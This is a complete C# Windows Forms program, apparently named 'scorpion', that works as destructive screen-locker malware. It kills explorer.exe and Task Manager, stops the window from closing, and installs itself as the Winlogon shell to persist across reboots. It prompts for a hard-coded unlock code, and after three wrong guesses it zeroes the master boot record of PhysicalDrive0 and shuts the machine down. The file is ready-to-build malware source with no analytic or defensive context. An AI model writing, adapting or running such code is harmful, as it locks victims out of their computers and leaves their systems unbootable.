using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace scorpion
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;

        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;


        int tries = 3;
        string code = "follow";

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // disable alt + f4
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // end explorer.exe -> no taskbar
            Process.Start("taskkill", "/f /im explorer.exe");

            endTaskmgr.Start();

            // write to shell key -> auto startup
            RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);

            RegistryKey regKey = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            regKey.SetValue("Shell", Application.ExecutablePath, RegistryValueKind.String);
            regKey.Close();
        }

        private void endTaskmgr_Tick(object sender, EventArgs e)
        {
            // end task manager
            Process[] taskmgr = Process.GetProcessesByName("taskmgr");
            if (taskmgr.Length > 0)
            {
                Process.Start("taskkill", "/f /im taskmgr.exe");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            tries--;
            label1.Text = "Remaining tries: " + tries;
            if (code_input.Text == code)
            {
                // display message box
                MessageBox.Show("Correct code!");

                // set explorer to shell again
                RegistryKey localMachine = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);

                RegistryKey regKey = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                regKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                regKey.Close();

                // run explorer
                Process.Start("explorer.exe");

                // exit
                Environment.Exit(0);
            }
            else if (tries == 0)
            {
                // kill mbr
                killmbr();
            }
        }

        private void killmbr()
        {
            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                0,
                IntPtr.Zero);

            WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero);

            Process.Start("shutdown", "-s -t 0");
        }
    }
}
